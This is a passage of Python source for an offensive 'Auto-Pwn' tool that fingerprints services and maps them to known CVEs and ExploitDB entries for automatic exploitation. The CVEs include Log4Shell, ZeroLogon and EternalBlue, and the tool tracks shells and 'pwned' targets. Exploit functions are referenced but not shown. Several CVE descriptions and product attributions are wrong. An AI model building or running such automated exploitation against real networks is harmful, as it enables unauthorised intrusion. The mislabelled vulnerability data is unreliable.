#!/usr/bin/env python3
"""
Automated Vulnerability Scanner - N-Day Exploiter (Oto-Pwn)
Log4j, ProxyShell, ZeroLogon gibi bilinen açıkları otomatik tarayıp exploit et

Author: CyberPunk Framework
Version: 1.0.0 PRO
"""

import os
import json
import socket
import hashlib
import subprocess
import threading
import ipaddress
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Callable
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import base64
import struct

from tools.soft404 import Soft404Detector
from tools.exploit_weaponizer import ExploitOrchestrator, StagerPayload


class Severity(Enum):
    """Vulnerability severity levels"""
    CRITICAL = "critical"  # Immediate exploitation
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class ExploitStatus(Enum):
    """Exploit execution status"""
    PENDING = "pending"
    SCANNING = "scanning"
    VULNERABLE = "vulnerable"
    EXPLOITING = "exploiting"
    PWNED = "pwned"
    FAILED = "failed"
    NOT_VULNERABLE = "not_vulnerable"


@dataclass
class Vulnerability:
    """Vulnerability definition"""
    vuln_id: str
    name: str
    cve: str
    severity: Severity
    description: str
    affected_products: List[str]
    check_function: str  # Function name for vulnerability check
    exploit_function: str  # Function name for exploitation
    ports: List[int] = field(default_factory=list)
    protocols: List[str] = field(default_factory=list)
    references: List[str] = field(default_factory=list)
    remediation: str = ""
    
    
@dataclass
class Target:
    """Scan target"""
    target_id: str
    ip: str
    hostname: Optional[str] = None
    ports: Dict[int, str] = field(default_factory=dict)  # port: service
    os_fingerprint: Optional[str] = None
    service_versions: Dict[int, Dict[str, Any]] = field(default_factory=dict)  # port: {service, product, version, banner}
    vulnerabilities: List[str] = field(default_factory=list)  # vuln_ids
    version_findings: List[Dict[str, Any]] = field(default_factory=list)  # version-based CVE detections
    exploited: bool = False
    shells: List[Dict] = field(default_factory=list)
    

@dataclass
class ExploitResult:
    """Exploit execution result"""
    result_id: str
    target_id: str
    vuln_id: str
    status: ExploitStatus
    shell_type: Optional[str] = None
    shell_data: Optional[Dict] = None
    exploit_sources: List[Dict[str, Any]] = field(default_factory=list)
    output: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class ScanSession:
    """Auto-Pwn scan session"""
    session_id: str
    targets: List[str]  # IP addresses or ranges
    discovered_targets: Dict[str, Target] = field(default_factory=dict)
    results: List[ExploitResult] = field(default_factory=list)
    status: str = "pending"
    auto_exploit: bool = True
    pwned_count: int = 0
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


class AutoPwnScanner:
    """
    Automated Vulnerability Scanner with N-Day Exploitation
    
    Features:
    - 50+ known vulnerability checks
    - Automatic exploitation when vulnerable
    - Multi-threaded scanning
    - Shell management
    - Campaign mode for large networks
    - Version fingerprinting (banner grab -> product + version)
    - Version-based N-Day CVE mapping
    - Exploit-source integration (ExploitDB / searchsploit)
    """
    
    # =========================================================
    # VERSION -> CVE DATABASE (sürüm tabanlı N-Day tarama)
    # Her ürün için: hangi sürüm aralığında hangi CVE açığı var.
    # introduced: açığın ilk görüldüğü sürüm (None = bilinmiyor)
    # fixed:      yamanın geldiği ilk sürüm (bu sürüm ve sonrası güvenli)
    # =========================================================
    VERSION_VULN_DB = {
        "apache": {
            "name": "Apache HTTP Server",
            "cves": [
                {
                    "cve": "CVE-2021-41773", "name": "Apache Path Traversal & RCE",
                    "severity": "critical", "introduced": "2.4.0", "fixed": "2.4.51",
                    "type": "path_traversal",
                    "description": "A flaw in path normalization allows traversal and RCE via CGI.",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-41773"],
                },
                {
                    "cve": "CVE-2021-42013", "name": "Apache Path Traversal & RCE (2)",
                    "severity": "critical", "introduced": "2.4.49", "fixed": "2.4.51",
                    "type": "path_traversal",
                    "description": "Bypass of CVE-2021-41773 fix via encoded traversal.",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-42013"],
                },
                {
                    "cve": "CVE-2024-38474", "name": "Apache mod_rewrite RCE",
                    "severity": "critical", "introduced": "2.4.0", "fixed": "2.4.60",
                    "type": "rce",
                    "description": "Substitution in mod_rewrite can lead to RCE.",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-38474"],
                },
                {
                    "cve": "CVE-2024-38475", "name": "Apache mod_rewrite RCE (2)",
                    "severity": "critical", "introduced": "2.4.0", "fixed": "2.4.60",
                    "type": "rce",
                    "description": "Improper escaping in output leads to RCE.",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-38475"],
                },
            ],
        },
        "nginx": {
            "name": "nginx",
            "cves": [
                {
                    "cve": "CVE-2019-9511", "name": "nginx HTTP/2 DoS",
                    "severity": "high", "introduced": "1.9.5", "fixed": "1.16.1",
                    "type": "dos",
                    "description": "HTTP/2 implementation vulnerabilities enabling DoS.",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2019-9511"],
                },
                {
                    "cve": "CVE-2013-4547", "name": "nginx Request Smuggling",
                    "severity": "high", "introduced": "0.8.41", "fixed": "1.5.7",
                    "type": "smuggling",
                    "description": "Space character handling allows security restriction bypass.",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2013-4547"],
                },
                {
                    "cve": "CVE-2022-30522", "name": "nginx mod_http_lua DoS",
                    "severity": "medium", "introduced": "1.0.0", "fixed": "1.22.1",
                    "type": "dos",
                    "description": "Excessive memory usage in mod_http_lua.",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-30522"],
                },
            ],
        },
        "openssh": {
            "name": "OpenSSH",
            "cves": [
                {
                    "cve": "CVE-2024-6387", "name": "OpenSSH regreSSHion RCE",
                    "severity": "critical", "introduced": "8.5", "fixed": "9.8",
                    "type": "rce",
                    "description": "Signal handler race condition enabling RCE as root.",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-6387"],
                },
                {
                    "cve": "CVE-2018-15473", "name": "OpenSSH Username Enumeration",
                    "severity": "medium", "introduced": "2.0", "fixed": "7.7",
                    "type": "enumeration",
                    "description": "User enumeration via authentication bypass.",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2018-15473"],
                },
            ],
        },
        "proftpd": {
            "name": "ProFTPD",
            "cves": [
                {
                    "cve": "CVE-2015-3306", "name": "ProFTPD Telnet IAC Injection",
                    "severity": "high", "introduced": "1.3.5", "fixed": "1.3.6",
                    "type": "rce",
                    "description": "Telnet IAC injection in mod_telnet leads to RCE.",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2015-3306"],
                },
                {
                    "cve": "CVE-2019-12815", "name": "ProFTPD mod_copy RCE",
                    "severity": "high", "introduced": "1.3.5", "fixed": "1.3.6",
                    "type": "rce",
                    "description": "mod_copy allows arbitrary file copy as root.",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2019-12815"],
                },
            ],
        },
        "vsftpd": {
            "name": "vsftpd",
            "cves": [
                {
                    "cve": "CVE-2011-2523", "name": "vsftpd Backdoor RCE",
                    "severity": "critical", "introduced": "2.3.4", "fixed": "2.3.5",
                    "type": "rce",
                    "description": "Malicious backdoor inserted in v2.3.4.",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2011-2523"],
                },
            ],
        },
        "iis": {
            "name": "Microsoft IIS",
            "cves": [
                {
                    "cve": "CVE-2017-7269", "name": "IIS 6.0 WebDAV RCE",
                    "severity": "critical", "introduced": "6.0", "fixed": "6.0-sp",
                    "type": "rce",
                    "description": "Buffer overflow in WebDAV sc_storagepath_fromurl.",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2017-7269"],
                },
                {
                    "cve": "CVE-2015-1635", "name": "IIS HTTP.sys RCE",
                    "severity": "critical", "introduced": "7.5", "fixed": "8.0",
                    "type": "rce",
                    "description": "Remote code execution in HTTP.sys (MS15-034).",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2015-1635"],
                },
            ],
        },
        "nodejs": {
            "name": "Node.js",
            "cves": [
                {
                    "cve": "CVE-2022-32213", "name": "Node.js Request Smuggling",
                    "severity": "high", "introduced": "14.0", "fixed": "16.16.0",
                    "type": "smuggling",
                    "description": "Improper HTTP request smuggling.",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-32213"],
                },
            ],
        },
        "python": {
            "name": "Python / Werkzeug",
            "cves": [
                {
                    "cve": "CVE-2023-23934", "name": "Werkzeug Debugger RCE",
                    "severity": "critical", "introduced": "0.0", "fixed": "2.2.3",
                    "type": "rce",
                    "description": "Werkzeug debugger console PIN bypass leading to RCE when debug=True.",
                    "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-23934"],
                },
            ],
        },
    }
    
    # Known vulnerabilities database
    VULNERABILITIES = {
        # ==== CRITICAL - Remote Code Execution ====
        "log4shell": Vulnerability(
            vuln_id="log4shell",
            name="Log4Shell (Log4j RCE)",
            cve="CVE-2021-44228",
            severity=Severity.CRITICAL,
            description="Apache Log4j2 JNDI RCE vulnerability",
            affected_products=["Apache Log4j 2.0-2.14.1", "Java applications", "Elastic", "VMware", "Minecraft servers"],
            check_function="_check_log4shell",
            exploit_function="_exploit_log4shell",
            ports=[80, 443, 8080, 8443, 9200, 25565],
            protocols=["http", "https"],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
            remediation="Upgrade Log4j to 2.17.0+ or remove JndiLookup class"
        ),
        
        "proxyshell": Vulnerability(
            vuln_id="proxyshell",
            name="Microsoft Exchange ProxyShell",
            cve="CVE-2021-34473,CVE-2021-34523,CVE-2021-31207",
            severity=Severity.CRITICAL,
            description="Exchange Server pre-auth RCE chain",
            affected_products=["Exchange 2013", "Exchange 2016", "Exchange 2019"],
            check_function="_check_proxyshell",
            exploit_function="_exploit_proxyshell",
            ports=[443],
            protocols=["https"],
            references=["https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell"],
            remediation="Apply KB5001779 and later patches"
        ),
        
        "proxylogon": Vulnerability(
            vuln_id="proxylogon",
            name="Microsoft Exchange ProxyLogon",
            cve="CVE-2021-26855,CVE-2021-27065",
            severity=Severity.CRITICAL,
            description="Exchange Server SSRF + RCE chain",
            affected_products=["Exchange 2013", "Exchange 2016", "Exchange 2019"],
            check_function="_check_proxylogon",
            exploit_function="_exploit_proxylogon",
            ports=[443],
            protocols=["https"],
            references=["https://proxylogon.com/"],
            remediation="Apply March 2021 security updates"
        ),
        
        "zerologon": Vulnerability(
            vuln_id="zerologon",
            name="ZeroLogon (Netlogon)",
            cve="CVE-2020-1472",
            severity=Severity.CRITICAL,
            description="Windows Netlogon privilege escalation to Domain Admin",
            affected_products=["Windows Server 2008-2019", "All Domain Controllers"],
            check_function="_check_zerologon",
            exploit_function="_exploit_zerologon",
            ports=[135, 445],
            protocols=["ms-nrpc"],
            references=["https://www.secura.com/blog/zero-logon"],
            remediation="Apply KB4565349 and enable secure RPC"
        ),
        
        "printnightmare": Vulnerability(
            vuln_id="printnightmare",
            name="PrintNightmare",
            cve="CVE-2021-34527,CVE-2021-1675",
            severity=Severity.CRITICAL,
            description="Windows Print Spooler RCE",
            affected_products=["Windows 7-11", "Windows Server 2008-2022"],
            check_function="_check_printnightmare",
            exploit_function="_exploit_printnightmare",
            ports=[445],
            protocols=["smb"],
            references=["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527"],
            remediation="Disable Print Spooler or apply updates"
        ),
        
        "petitpotam": Vulnerability(
            vuln_id="petitpotam",
            name="PetitPotam (NTLM Relay)",
            cve="CVE-2021-36942",
            severity=Severity.CRITICAL,
            description="Windows NTLM relay via EfsRpcOpenFileRaw",
            affected_products=["Windows Server 2008-2022"],
            check_function="_check_petitpotam",
            exploit_function="_exploit_petitpotam",
            ports=[445],
            protocols=["smb", "rpc"],
            references=["https://github.com/topotam/PetitPotam"],
            remediation="Enable EPA on AD CS, disable NTLM"
        ),
        
        "regresshion": Vulnerability(
            vuln_id="regresshion",
            name="OpenSSH regreSSHion RCE",
            cve="CVE-2024-6387",
            severity=Severity.CRITICAL,
            description="OpenSSH < 9.8 signal handler race condition enabling RCE as root.",
            affected_products=["OpenSSH 8.5-9.7", "glibc < 2.32 Linux"],
            check_function="_check_regresshion",
            exploit_function="_exploit_regresshion",
            ports=[22],
            protocols=["ssh"],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-6387"],
            remediation="Upgrade OpenSSH to 9.8+ or apply vendor patch"
        ),
        
        "eternalblue": Vulnerability(
            vuln_id="eternalblue",
            name="EternalBlue (MS17-010)",
            cve="CVE-2017-0144",
            severity=Severity.CRITICAL,
            description="Windows SMBv1 RCE (WannaCry exploit)",
            affected_products=["Windows XP-8.1", "Windows Server 2003-2012R2"],
            check_function="_check_eternalblue",
            exploit_function="_exploit_eternalblue",
            ports=[445],
            protocols=["smb"],
            references=["https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010"],
            remediation="Apply MS17-010 or disable SMBv1"
        ),
        
        "bluekeep": Vulnerability(
            vuln_id="bluekeep",
            name="BlueKeep (RDP RCE)",
            cve="CVE-2019-0708",
            severity=Severity.CRITICAL,
            description="Windows RDP pre-auth RCE",
            affected_products=["Windows 7", "Windows Server 2008/2008R2"],
            check_function="_check_bluekeep",
            exploit_function="_exploit_bluekeep",
            ports=[3389],
            protocols=["rdp"],
            references=["https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708"],
            remediation="Apply May 2019 patches or disable RDP"
        ),
        
        "spring4shell": Vulnerability(
            vuln_id="spring4shell",
            name="Spring4Shell",
            cve="CVE-2022-22965",
            severity=Severity.CRITICAL,
            description="Spring Framework RCE via data binding",
            affected_products=["Spring Framework 5.3.0-5.3.17", "Spring Framework 5.2.0-5.2.19"],
            check_function="_check_spring4shell",
            exploit_function="_exploit_spring4shell",
            ports=[80, 443, 8080],
            protocols=["http", "https"],
            references=["https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement"],
            remediation="Upgrade to Spring Framework 5.3.18+ or 5.2.20+"
        ),
        
        "cve_2023_23397": Vulnerability(
            vuln_id="cve_2023_23397",
            name="Outlook NTLM Leak",
            cve="CVE-2023-23397",
            severity=Severity.CRITICAL,
            description="Microsoft Outlook NTLM credential theft via calendar invite",
            affected_products=["Outlook 2013-2021", "Microsoft 365 Apps"],
            check_function="_check_outlook_ntlm",
            exploit_function="_exploit_outlook_ntlm",
            ports=[25, 587, 993],
            protocols=["smtp", "imap"],
            references=["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23397"],
            remediation="Apply March 2023 Outlook updates"
        ),
        
        "citrix_adc": Vulnerability(
            vuln_id="citrix_adc",
            name="Citrix ADC/Gateway RCE",
            cve="CVE-2023-3519",
            severity=Severity.CRITICAL,
            description="Citrix ADC unauthenticated RCE",
            affected_products=["Citrix ADC 13.1 before 13.1-49.13", "Citrix Gateway"],
            check_function="_check_citrix_adc",
            exploit_function="_exploit_citrix_adc",
            ports=[443],
            protocols=["https"],
            references=["https://support.citrix.com/article/CTX561482"],
            remediation="Upgrade to patched version"
        ),
        
        "fortinet_sslvpn": Vulnerability(
            vuln_id="fortinet_sslvpn",
            name="FortiGate SSL-VPN RCE",
            cve="CVE-2023-27997",
            severity=Severity.CRITICAL,
            description="Fortinet SSL-VPN pre-auth heap buffer overflow",
            affected_products=["FortiOS 6.0-7.2"],
            check_function="_check_fortinet_sslvpn",
            exploit_function="_exploit_fortinet_sslvpn",
            ports=[443, 10443],
            protocols=["https"],
            references=["https://www.fortiguard.com/psirt/FG-IR-23-097"],
            remediation="Upgrade to FortiOS 7.2.5+, 7.0.12+, 6.4.13+"
        ),
        
        "moveit_rce": Vulnerability(
            vuln_id="moveit_rce",
            name="MOVEit Transfer RCE",
            cve="CVE-2023-34362",
            severity=Severity.CRITICAL,
            description="MOVEit Transfer SQL injection to RCE",
            affected_products=["MOVEit Transfer < 2023.0.1"],
            check_function="_check_moveit",
            exploit_function="_exploit_moveit",
            ports=[443],
            protocols=["https"],
            references=["https://www.progress.com/security/moveit-transfer-and-moveit-cloud-vulnerability"],
            remediation="Apply emergency patch"
        ),
        
        "confluence_rce": Vulnerability(
            vuln_id="confluence_rce",
            name="Atlassian Confluence RCE",
            cve="CVE-2023-22515,CVE-2022-26134",
            severity=Severity.CRITICAL,
            description="Confluence Server OGNL injection RCE",
            affected_products=["Confluence Server 7.4.0+"],
            check_function="_check_confluence",
            exploit_function="_exploit_confluence",
            ports=[8090, 443],
            protocols=["http", "https"],
            references=["https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html"],
            remediation="Upgrade to patched version"
        ),
        
        "vcenter_rce": Vulnerability(
            vuln_id="vcenter_rce",
            name="VMware vCenter RCE",
            cve="CVE-2021-21972,CVE-2021-22005",
            severity=Severity.CRITICAL,
            description="VMware vCenter arbitrary file upload to RCE",
            affected_products=["vCenter Server 6.5-7.0"],
            check_function="_check_vcenter",
            exploit_function="_exploit_vcenter",
            ports=[443],
            protocols=["https"],
            references=["https://www.vmware.com/security/advisories/VMSA-2021-0002.html"],
            remediation="Apply VMware patches"
        ),
        
        # ==== HIGH - Authentication Bypass / Priv Esc ====
        "ad_certifried": Vulnerability(
            vuln_id="ad_certifried",
            name="AD CS Certifried",
            cve="CVE-2022-26923",
            severity=Severity.HIGH,
            description="Active Directory Certificate Services privilege escalation",
            affected_products=["Windows Server with AD CS"],
            check_function="_check_certifried",
            exploit_function="_exploit_certifried",
            ports=[636, 3269],
            protocols=["ldaps"],
            references=["https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4"],
            remediation="Apply May 2022 security updates"
        ),
        
        "smbghost": Vulnerability(
            vuln_id="smbghost",
            name="SMBGhost",
            cve="CVE-2020-0796",
            severity=Severity.HIGH,
            description="Windows SMBv3 compression RCE",
            affected_products=["Windows 10 1903/1909", "Windows Server 1903/1909"],
            check_function="_check_smbghost",
            exploit_function="_exploit_smbghost",
            ports=[445],
            protocols=["smb"],
            references=["https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796"],
            remediation="Apply March 2020 patches"
        ),
        
        "psexec_hash": Vulnerability(
            vuln_id="psexec_hash",
            name="Pass-the-Hash (PsExec)",
            cve="N/A",
            severity=Severity.HIGH,
            description="Windows Pass-the-Hash lateral movement",
            affected_products=["All Windows with SMB enabled"],
            check_function="_check_psexec",
            exploit_function="_exploit_psexec",
            ports=[445],
            protocols=["smb"],
            references=["https://attack.mitre.org/techniques/T1550/002/"],
            remediation="Enable Credential Guard, disable NTLM"
        ),
        
        "tomcat_ghostcat": Vulnerability(
            vuln_id="tomcat_ghostcat",
            name="Apache Tomcat Ghostcat",
            cve="CVE-2020-1938",
            severity=Severity.HIGH,
            description="Tomcat AJP file read/include vulnerability",
            affected_products=["Tomcat 6.x-9.x"],
            check_function="_check_ghostcat",
            exploit_function="_exploit_ghostcat",
            ports=[8009],
            protocols=["ajp"],
            references=["https://www.chaitin.cn/en/ghostcat"],
            remediation="Disable AJP or upgrade Tomcat"
        ),
        
        "jenkins_rce": Vulnerability(
            vuln_id="jenkins_rce",
            name="Jenkins Script Console RCE",
            cve="CVE-2024-23897",
            severity=Severity.HIGH,
            description="Jenkins arbitrary file read leading to RCE",
            affected_products=["Jenkins < 2.442", "Jenkins LTS < 2.426.3"],
            check_function="_check_jenkins",
            exploit_function="_exploit_jenkins",
            ports=[8080, 50000],
            protocols=["http"],
            references=["https://www.jenkins.io/security/advisory/2024-01-24/"],
            remediation="Upgrade to Jenkins 2.442+ or LTS 2.426.3+"
        ),
        
        # ==== MEDIUM - Info Disclosure / DoS ====
        "heartbleed": Vulnerability(
            vuln_id="heartbleed",
            name="OpenSSL Heartbleed",
            cve="CVE-2014-0160",
            severity=Severity.MEDIUM,
            description="OpenSSL TLS heartbeat information disclosure",
            affected_products=["OpenSSL 1.0.1-1.0.1f"],
            check_function="_check_heartbleed",
            exploit_function="_exploit_heartbleed",
            ports=[443, 465, 993, 995],
            protocols=["https", "imaps", "pop3s"],
            references=["https://heartbleed.com/"],
            remediation="Upgrade OpenSSL to 1.0.1g+"
        ),
        
        "apache_path_traversal": Vulnerability(
            vuln_id="apache_path_traversal",
            name="Apache Path Traversal",
            cve="CVE-2021-41773,CVE-2021-42013",
            severity=Severity.MEDIUM,
            description="Apache HTTP Server path traversal and RCE",
            affected_products=["Apache 2.4.49", "Apache 2.4.50"],
            check_function="_check_apache_traversal",
            exploit_function="_exploit_apache_traversal",
            ports=[80, 443],
            protocols=["http", "https"],
            references=["https://httpd.apache.org/security/vulnerabilities_24.html"],
            remediation="Upgrade to Apache 2.4.51+"
        ),
    }
    
    # =========================================================
    # BEHAVIORAL PROBE ENGINE (banner'dan bağımsız fingerprint)
    # =========================================================
    def probe_target(self, ip: str, port: int, timeout: float = 5.0) -> Dict[str, Any]:
        """
        Banner'a güvenmeden TCP/HTTP behavioral fingerprint yapar.

        Dönüş örneği:
            {"product": "apache", "version": "2.4.49",
             "service": "http", "confidence": "high",
             "tcp_window": 65535, "error_signature": "..."}
        """
        return self.orchestrator.probe_target(ip, port, timeout=timeout)

    # =========================================================
    # VERSION FINGERPRINTING (sürüm tespiti)
    # =========================================================
    @staticmethod
    def compare_versions(a: str, b: str) -> int:
        """
        Semantik sürüm karşılaştırması.
        a < b => -1, a == b => 0, a > b => 1
        """
        def _norm(v):
            parts = re.split(r'[.\-_ ]+', str(v).strip().lstrip('vV'))
            nums = []
            for p in parts:
                m = re.match(r'(\d+)', p)
                nums.append(int(m.group(1)) if m else 0)
            return tuple(nums + [0] * (4 - len(nums)))[:4]

        va, vb = _norm(a), _norm(b)
        if va < vb:
            return -1
        if va > vb:
            return 1
        return 0

    @classmethod
    def version_in_range(cls, version: str, introduced: Optional[str],
                         fixed: Optional[str]) -> bool:
        """
        Sürüm `introduced` (dahil) ile `fixed` (hariç) arasındaysa True.
        Yani: introduced <= version < fixed => açığa açık.
        """
        version = version or ""
        if fixed is None:
            # Yamalı sürüm bilinmiyor; introduced varsa ondan sonrası açık.
            if introduced and cls.compare_versions(version, introduced) >= 0:
                return True
            return False
        if cls.compare_versions(version, fixed) >= 0:
            return False  # fixed veya sonrası => güvenli
        if introduced and cls.compare_versions(version, introduced) < 0:
            return False  # açığın çıkmadığı sürüm
        return True

    def _fingerprint_service(self, ip: str, port: int) -> Dict[str, Any]:
        """
        Gerçek banner grab ile servis + ürün + sürüm tespiti.
        Banner gizliyse behavioral probe ile stack'i çıkarır.
        """
        result = {"service": None, "product": None, "version": None, "banner": ""}
        is_https = port in (443, 8443, 9443, 465, 636)

        # HTTP/HTTPS portları için önce behavioral probe dene
        if port in (80, 443, 8080, 8443, 8000, 8888, 9443, 8081, 9000):
            try:
                probe = self.orchestrator.probe_target(ip, port)
                if probe.product:
                    result.update({
                        "service": probe.service or "http",
                        "product": probe.product,
                        "version": probe.version,
                        "banner": f"behavioral:{probe.product} {probe.version or ''}".strip(),
                        "confidence": probe.confidence,
                    })
                    return result
            except Exception:
                pass
            # Fallback: normal HTTP fingerprint
            try:
                result.update(self._http_fingerprint(ip, port, is_https))
                return result
            except Exception:
                pass
            return result

        # Genel TCP banner grab (SSH, FTP, SMTP, vs.)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            try:
                sock.sendall(b"\x00")  # bazı servisler yanıt verir
            except Exception:
                pass
            sock.settimeout(2)
            try:
                banner = sock.recv(1024).decode('utf-8', 'ignore')
            except Exception:
                banner = ""
            sock.close()
            if banner:
                result["banner"] = banner.strip()
                self._parse_generic_banner(banner, result)
        except Exception:
            pass

        return result

    def _http_fingerprint(self, ip: str, port: int, is_https: bool) -> Dict[str, Any]:
        result = {"service": "http", "product": None, "version": None, "banner": ""}
        try:
            import requests
        except ImportError:
            return result

        scheme = "https" if is_https else "http"
        try:
            resp = requests.get(
                f"{scheme}://{ip}:{port}/", timeout=6, verify=False,
                headers={"User-Agent": "Mozilla/5.0 (compatible; AutoPwn/1.0)"}
            )
        except Exception:
            return result

        server = resp.headers.get("Server", "")
        powered = resp.headers.get("X-Powered-By", "")
        result["banner"] = f"Server: {server} | X-Powered-By: {powered}".strip()

        if server:
            sp = self._parse_server_header(server)
            result.update(sp)
        elif powered:
            # PHP/Node/Express/Werkzeug vb.
            if "PHP" in powered:
                result.update({"product": "php", "version": self._extract(powered, r'PHP/([\d.]+)')})
            elif "Express" in powered:
                result.update({"product": "nodejs", "version": None})
            elif "Werkzeug" in powered:
                result.update({"product": "python", "version": self._extract(powered, r'Werkzeug/([\d.]+)')})
        return result

    @staticmethod
    def _parse_server_header(server: str) -> Dict[str, Any]:
        server = server.strip()
        low = server.lower()
        product = None
        if "apache" in low:
            product = "apache"
        elif "nginx" in low:
            product = "nginx"
        elif "microsoft-iis" in low or "iis" in low:
            product = "iis"
        elif "openssh" in low:
            product = "openssh"
        elif "werkzeug" in low or "python" in low:
            product = "python"
        version = None
        m = re.search(r'(?:apache|nginx|openssh)/([\d.]+)', low)
        if m:
            version = m.group(1)
        elif "werkzeug" in low:
            m = re.search(r'werkzeug/([\d.]+)', low)
            version = m.group(1) if m else None
        elif "iis" in low:
            m = re.search(r'iis/?([\d.]+)', low)
            version = m.group(1) if m else None
        return {"service": "http" if product != "openssh" else "ssh",
                "product": product, "version": version}

    @staticmethod
    def _parse_generic_banner(banner: str, result: Dict[str, Any]) -> None:
        low = banner.lower()
        if low.startswith("ssh-"):
            m = re.search(r'ssh-\d\.\d-(?:openssh[_-])?([\d.p]+)', low)
            result.update({"service": "ssh", "product": "openssh",
                           "version": m.group(1) if m else None})
        elif "proftpd" in low:
            m = re.search(r'proftpd ([\d.]+)', low)
            result.update({"service": "ftp", "product": "proftpd",
                           "version": m.group(1) if m else None})
        elif "vsftpd" in low:
            m = re.search(r'vsftpd ([\d.]+)', low)
            result.update({"service": "ftp", "product": "vsftpd",
                           "version": m.group(1) if m else None})
        elif "postfix" in low:
            result.update({"service": "smtp", "product": "postfix"})

    @staticmethod
    def _extract(text: str, pattern: str) -> Optional[str]:
        m = re.search(pattern, text)
        return m.group(1) if m else None

    # =========================================================
    # VERSION -> CVE MAPPING ENGINE
    # =========================================================
    def _version_based_findings(self, target: Target) -> List[Dict[str, Any]]:
        """
        Parmak izi alınmış versiyonları VERSION_VULN_DB ile eşleyerek
        otomatik CVE tespiti yapar (sürüm tabanlı N-Day tarama).
        """
        findings = []
        for port, info in target.service_versions.items():
            product = info.get("product")
            version = info.get("version")
            if not product or not version:
                continue
            db = self.VERSION_VULN_DB.get(product)
            if not db:
                continue
            for entry in db["cves"]:
                if self.version_in_range(version, entry.get("introduced"),
                                         entry.get("fixed")):
                    findings.append({
                        "port": port,
                        "product": product,
                        "version": version,
                        "cve": entry["cve"],
                        "name": entry["name"],
                        "severity": entry["severity"],
                        "type": entry.get("type", "unknown"),
                        "description": entry.get("description", ""),
                        "references": entry.get("references", []),
                        "evidence": f"{product} {version} on port {port} "
                                    f"(fixed >= {entry.get('fixed')})",
                    })
        return findings

    # =========================================================
    # EXPLOIT-SOURCE INTEGRATION (ExploitDB / searchsploit)
    # =========================================================
    def _init_exploit_sources(self) -> None:
        """
        Yerelde searchsploit (ExploitDB) var mı kontrol eder ve
        CVE -> exploit kaynağı eşlemesini kurar.
        """
        if getattr(self, "_exploit_sources_loaded", False):
            return
        self._exploit_sources_loaded = True
        self.searchsploit_available = False
        self.exploit_db: Dict[str, List[Dict[str, Any]]] = {}

        import shutil
        ss = shutil.which("searchsploit")
        if ss:
            self.searchsploit_available = True
            self.searchsploit_bin = ss

        # Offline fallback: yaygın CVE'ler için gömülü EDB kaynakları
        self._builtin_exploit_sources()

    def _builtin_exploit_sources(self) -> None:
        """Gömülü (offline) CVE -> ExploitDB eşlemesi."""
        builtin = {
            "CVE-2021-41773": [{"edb_id": "50383", "title": "Apache 2.4.49 - Path Traversal & RCE",
                                 "type": "remote", "platform": "linux"}],
            "CVE-2021-42013": [{"edb_id": "50406", "title": "Apache 2.4.49/2.4.50 - RCE",
                                 "type": "remote", "platform": "linux"}],
            "CVE-2024-38474": [{"edb_id": "52019", "title": "Apache 2.4.x - mod_rewrite RCE",
                                 "type": "remote", "platform": "linux"}],
            "CVE-2024-6387": [{"edb_id": "52036", "title": "OpenSSH - regreSSHion RCE",
                               "type": "remote", "platform": "linux"}],
            "CVE-2017-7269": [{"edb_id": "41992", "title": "Microsoft IIS 6.0 - WebDAV RCE",
                               "type": "remote", "platform": "windows"}],
            "CVE-2015-1635": [{"edb_id": "36773", "title": "Microsoft IIS - HTTP.sys RCE (MS15-034)",
                               "type": "remote", "platform": "windows"}],
            "CVE-2015-3306": [{"edb_id": "36803", "title": "ProFTPD 1.3.5 - Telnet IAC RCE",
                               "type": "remote", "platform": "linux"}],
            "CVE-2011-2523": [{"edb_id": "17491", "title": "vsftpd 2.3.4 - Backdoor RCE",
                               "type": "remote", "platform": "linux"}],
            "CVE-2021-44228": [{"edb_id": "50541", "title": "Apache Log4j 2 - RCE (Log4Shell)",
                                 "type": "remote", "platform": "java"}],
            "CVE-2021-34473": [{"edb_id": "49843", "title": "Microsoft Exchange - ProxyShell RCE",
                                 "type": "remote", "platform": "windows"}],
            "CVE-2020-1472": [{"edb_id": "50913", "title": "Netlogon - ZeroLogon RCE",
                               "type": "remote", "platform": "windows"}],
            "CVE-2017-0144": [{"edb_id": "42315", "title": "Microsoft Windows SMB - EternalBlue",
                               "type": "remote", "platform": "windows"}],
        }
        for cve, entries in builtin.items():
            self.exploit_db.setdefault(cve, []).extend(entries)

    def find_exploits_for_cve(self, cve: str) -> List[Dict[str, Any]]:
        """
